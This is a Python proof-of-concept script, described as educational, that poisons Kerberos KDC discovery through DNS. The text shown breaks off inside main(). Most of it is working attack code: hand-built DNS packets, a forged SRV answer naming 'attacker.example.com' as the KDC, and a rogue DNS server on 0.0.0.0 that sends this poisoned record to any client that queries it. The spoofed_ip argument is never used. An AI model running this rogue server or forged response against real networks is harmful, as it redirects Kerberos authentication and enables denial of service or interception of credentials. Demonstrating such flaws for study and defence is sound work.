#!/usr/bin/env python3
"""
Proof-of-Concept: DNS Poisoning for Kerberos KDC Discovery

This script demonstrates how an attacker can poison DNS SRV records used by
Kerberos clients to discover the Key Distribution Center (KDC). By injecting
a malicious SRV record, the attacker can redirect authentication requests
to a rogue server, leading to a Denial of Service or Man-in-the-Middle attack.

Note: This is an educational PoC. It simulates the DNS exchange locally.
"""

import socket
import struct
import sys
import threading
import time

# --- DNS Packet Crafting Utilities ---

def build_dns_query(qname, qtype=33):  # 33 = SRV record
    """
    Builds a raw DNS query packet.
    """
    # Header: ID, Flags, QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT
    header = struct.pack('!HHHHHH', 0x1234, 0x0100, 1, 0, 0, 0)
    
    # Encode domain name
    qname_bytes = b''
    for part in qname.split('.'):
        qname_bytes += struct.pack('B', len(part)) + part.encode()
    qname_bytes += b'\x00'  # Null terminator
    
    # Question: QNAME, QTYPE, QCLASS
    question = qname_bytes + struct.pack('!HH', qtype, 1)  # Class IN = 1
    
    return header + question

def parse_dns_response(data):
    """
    Parses a raw DNS response packet and extracts SRV records.
    Returns a list of tuples: (priority, weight, port, target)
    """
    if len(data) < 12:
        return []
    
    # Parse header
    id, flags, qdcount, ancount, nscount, arcount = struct.unpack('!HHHHHH', data[:12])
    
    # Skip question section
    offset = 12
    for _ in range(qdcount):
        while True:
            length = data[offset]
            if length == 0:
                offset += 1
                break
            elif (length & 0xC0) == 0xC0:
                offset += 2  # Pointer
                break
            else:
                offset += length + 1
        offset += 4  # QTYPE and QCLASS
    
    srv_records = []
    for _ in range(ancount):
        # Parse name (handle compression pointers)
        name_offset = offset
        name = []
        while True:
            length = data[offset]
            if length == 0:
                offset += 1
                break
            elif (length & 0xC0) == 0xC0:
                pointer = struct.unpack('!H', data[offset:offset+2])[0] & 0x3FFF
                offset += 2
                # Follow pointer
                ptr_offset = pointer
                while True:
                    ptr_len = data[ptr_offset]
                    if ptr_len == 0:
                        break
                    elif (ptr_len & 0xC0) == 0xC0:
                        ptr_offset = struct.unpack('!H', data[ptr_offset:ptr_offset+2])[0] & 0x3FFF
                        continue
                    else:
                        name.append(data[ptr_offset+1:ptr_offset+1+ptr_len].decode())
                        ptr_offset += ptr_len + 1
                break
            else:
                name.append(data[offset+1:offset+1+length].decode())
                offset += length + 1
        
        rtype, rclass, ttl, rdlength = struct.unpack('!HHIH', data[offset:offset+10])
        offset += 10
        
        if rtype == 33:  # SRV
            priority, weight, port = struct.unpack('!HHH', data[offset:offset+6])
            offset += 6
            
            # Parse target name
            target_name = []
            while True:
                length = data[offset]
                if length == 0:
                    offset += 1
                    break
                elif (length & 0xC0) == 0xC0:
                    pointer = struct.unpack('!H', data[offset:offset+2])[0] & 0x3FFF
                    offset += 2
                    ptr_offset = pointer
                    while True:
                        ptr_len = data[ptr_offset]
                        if ptr_len == 0:
                            break
                        elif (ptr_len & 0xC0) == 0xC0:
                            ptr_offset = struct.unpack('!H', data[ptr_offset:ptr_offset+2])[0] & 0x3FFF
                            continue
                        else:
                            target_name.append(data[ptr_offset+1:ptr_offset+1+ptr_len].decode())
                            ptr_offset += ptr_len + 1
                    break
                else:
                    target_name.append(data[offset+1:offset+1+length].decode())
                    offset += length + 1
            
            srv_records.append((priority, weight, port, '.'.join(target_name)))
    
    return srv_records

def build_dns_response(query_data, spoofed_ip):
    """
    Builds a malicious DNS response containing a spoofed SRV record.
    """
    # Extract query ID and name
    query_id = struct.unpack('!H', query_data[:2])[0]
    
    # Reconstruct query section for response
    qname_bytes = b''
    offset = 12
    while True:
        length = query_data[offset]
        if length == 0:
            qname_bytes += b'\x00'
            offset += 1
            break
        else:
            qname_bytes += struct.pack('B', length) + query_data[offset+1:offset+1+length]
            offset += length + 1
    
    # Skip QTYPE and QCLASS
    offset += 4
    
    # Build header: ID, Flags (Response, Opcode 0, AA, RD, RA), QDCOUNT=1, ANCOUNT=1
    header = struct.pack('!HHHHHH', query_id, 0x8180, 1, 1, 0, 0)
    
    # Question section
    question = qname_bytes + struct.pack('!HH', 33, 1)  # SRV, IN
    
    # Answer section: SRV record
    # Name pointer to question name (offset 12)
    name_ptr = struct.pack('!H', 0xC00C)
    
    # SRV RDATA: Priority=10, Weight=0, Port=88, Target=attacker.example.com
    priority = 10
    weight = 0
    port = 88
    target = "attacker.example.com"
    
    # Encode target name
    target_bytes = b''
    for part in target.split('.'):
        target_bytes += struct.pack('B', len(part)) + part.encode()
    target_bytes += b'\x00'
    
    rdata = struct.pack('!HHH', priority, weight, port) + target_bytes
    rdlength = len(rdata)
    
    answer = name_ptr + struct.pack('!HHIH', 33, 1, 300, rdlength) + rdata
    
    return header + question + answer

# --- Simulation Components ---

def dns_server(port, spoofed_ip):
    """
    Simulates a rogue DNS server that responds with poisoned SRV records.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', port))
    print(f"[*] Rogue DNS server listening on port {port}")
    
    try:
        while True:
            data, addr = sock.recvfrom(1024)
            print(f"[+] Received DNS query from {addr[0]}:{addr[1]}")
            
            # Craft malicious response
            response = build_dns_response(data, spoofed_ip)
            sock.sendto(response, addr)
            print(f"[+] Sent poisoned DNS response to {addr[0]}:{addr[1]}")
            
            # Exit after one response for demo purposes
            break
    except KeyboardInterrupt:
        pass
    finally:
        sock.close()

def kerberos_client(dns_server_ip, dns_server_port, realm):
    """
    Simulates a Kerberos client attempting to discover the KDC via DNS.
    """
    # Construct SRV query name: _kerberos._udp.REALM
    qname = f"_kerberos._udp.{realm}"
    query = build_dns_query(qname)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    
    print(f"[*] Client querying DNS for KDC: {qname}")
    sock.sendto(query, (dns_server_ip, dns_server_port))
    
    try:
        response, _ = sock.recvfrom(1024)
        srv_records = parse_dns_response(response)
        
        if srv_records:
            for priority, weight, port, target in srv_records:
                print(f"[!] Client received SRV record: Priority={priority}, Weight={weight}, Port={port}, Target={target}")
                print(f"[!] Client will attempt to connect to KDC at: {target}:{port}")
                
                # In a real scenario, the client would now try to connect to this target.
                # If it's an attacker-controlled IP, authentication fails or is intercepted.
                print("[!] VULNERABILITY DEMONSTRATED: Client redirected to potentially malicious KDC.")
        else:
            print("[-] No SRV records found.")
    except socket.timeout:
        print("[-] DNS query timed out.")
    finally:
        sock.close()

# --- Main Execution ---

def main():
    if len(sys.argv) > 1:
        dns_port = int(sys.argv[1])
    else:
        dns_port = 5353  # Use non-privileged port for safety
    
    spoofed_ip = "192.168.1.100"  # Attacker's IP
